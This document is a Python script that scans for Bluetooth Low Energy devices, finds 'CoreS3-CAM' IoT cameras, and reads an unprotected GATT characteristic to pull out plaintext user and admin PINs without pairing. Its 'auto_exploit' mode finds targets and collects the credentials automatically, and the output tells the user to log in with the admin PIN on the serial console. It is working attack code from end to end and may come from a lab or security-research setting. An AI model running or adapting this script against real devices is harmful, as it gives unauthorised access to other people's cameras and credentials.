#!/usr/bin/env python3
"""
BLE Scanner and GATT Credential Extractor

Scans for BLE devices, enumerates GATT services and characteristics,
and reads characteristic values to extract plaintext credentials
(user PIN, admin PIN) from unprotected GATT characteristics.

Requires: bleak (pip install bleak)
"""

import argparse
import asyncio
import sys

try:
    from bleak import BleakClient, BleakScanner
except ImportError:
    print("[ERROR] bleak is required: pip install bleak")
    sys.exit(1)


# CoreS3 BLE service and characteristic UUIDs
SERVICE_UUID = "12345678-1234-5678-1234-56789abc0001"
CONFIG_CHAR_UUID = "12345678-1234-5678-1234-56789abc0002"


async def scan_devices(duration=10, filter_name=None):
    """Scan for BLE devices and return a list of discovered devices."""
    print(f"[*] Scanning for BLE devices ({duration}s)...")
    devices = await BleakScanner.discover(timeout=duration)

    results = []
    for d in devices:
        name = d.name or "(unknown)"
        if filter_name and filter_name not in name:
            continue
        results.append(d)
        rssi = getattr(d, 'rssi', None) or "?"
        print(f"  {d.address}  {name}  RSSI={rssi}")

    if not results:
        if filter_name:
            print(f"[-] No devices matching '{filter_name}' found.")
        else:
            print(f"[-] No BLE devices found.")
    else:
        print(f"[+] Found {len(results)} device(s)")

    return results


async def enumerate_services(address):
    """Connect to a device and list all GATT services and characteristics."""
    print(f"[*] Connecting to {address}...")
    async with BleakClient(address) as client:
        print(f"[+] Connected to {address}")
        print()
        for service in client.services:
            print(f"  Service: {service.uuid}")
            for char in service.characteristics:
                props = ", ".join(char.properties)
                print(f"    Characteristic: {char.uuid}")
                print(f"      Properties: {props}")
                print(f"      Handle: 0x{char.handle:04X}")
        print()


async def read_credentials(address):
    """Connect and read the config characteristic to extract credentials."""
    print(f"[*] Connecting to {address}...")
    async with BleakClient(address) as client:
        print(f"[+] Connected")

        # Read the config characteristic
        print(f"[*] Reading characteristic {CONFIG_CHAR_UUID}...")
        try:
            data = await client.read_gatt_char(CONFIG_CHAR_UUID)
        except Exception as e:
            print(f"[-] Failed to read characteristic: {e}")
            return None

        # Show raw hex
        hex_str = " ".join(f"{b:02X}" for b in data)
        print(f"[*] Raw hex: {hex_str}")

        # Decode as ASCII
        decoded = data.decode('utf-8', errors='ignore')
        print(f"[+] Decoded: {decoded}")
        print()

        # Parse key=value pairs
        credentials = {}
        for field in decoded.split(';'):
            if '=' in field:
                key, _, val = field.partition('=')
                credentials[key.strip()] = val.strip()
                print(f"  {key.strip()} = {val.strip()}")

        if credentials:
            print()
            print("=" * 50)
            print("[+] CREDENTIALS EXTRACTED VIA BLE")
            print("=" * 50)
            for k, v in credentials.items():
                print(f"  {k}: {v}")
            print()
            print("[*] No pairing or authentication was required.")
            print("[*] Use 'login <admin_pin>' on serial console for admin access.")
        else:
            print("[-] No credential pairs found in characteristic value.")

        return credentials


async def auto_exploit(duration=10):
    """Scan for CoreS3 devices and automatically extract credentials."""
    devices = await scan_devices(duration=duration, filter_name="CoreS3-CAM")
    if not devices:
        print("[-] No CoreS3 devices found. Ensure BLE is enabled on the device.")
        return None

    for d in devices:
        print()
        print(f"[*] Targeting: {d.name} ({d.address})")
        creds = await read_credentials(d.address)
        if creds:
            return creds

    return None


def main():
    parser = argparse.ArgumentParser(
        description="BLE scanner and GATT credential extractor for CoreS3 IoT camera. "
                    "Discovers BLE devices, enumerates services, and extracts "
                    "plaintext credentials from unprotected GATT characteristics.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --scan
      Scan for nearby BLE devices (10 second scan)

  %(prog)s --scan --duration 30
      Scan for 30 seconds

  %(prog)s --connect 24:0A:C4:XX:XX:XX --enumerate
      Connect and list all GATT services and characteristics

  %(prog)s --connect 24:0A:C4:XX:XX:XX --read
      Read config characteristic and extract credentials

  %(prog)s --auto
      Scan for CoreS3 devices and automatically extract credentials

Prerequisites:
  pip install bleak
""",
    )

    parser.add_argument("--scan", action="store_true",
                        help="Scan for nearby BLE devices")
    parser.add_argument("--duration", type=int, default=10,
                        help="Scan duration in seconds (default: 10)")
    parser.add_argument("--connect", metavar="ADDRESS",
                        help="BLE MAC address to connect to")
    parser.add_argument("--enumerate", action="store_true",
                        help="Enumerate GATT services and characteristics")
    parser.add_argument("--read", action="store_true",
                        help="Read config characteristic and extract credentials")
    parser.add_argument("--auto", action="store_true",
                        help="Auto-scan for CoreS3 devices and extract credentials")

    args = parser.parse_args()

    if not any([args.scan, args.connect, args.auto]):
        parser.print_help()
        return 1

    if args.auto:
        asyncio.run(auto_exploit(duration=args.duration))
    elif args.scan:
        asyncio.run(scan_devices(duration=args.duration))
    elif args.connect:
        if args.enumerate:
            asyncio.run(enumerate_services(args.connect))
        elif args.read:
            asyncio.run(read_credentials(args.connect))
        else:
            # Default: read credentials
            asyncio.run(read_credentials(args.connect))

    return 0


if __name__ == "__main__":
    sys.exit(main())
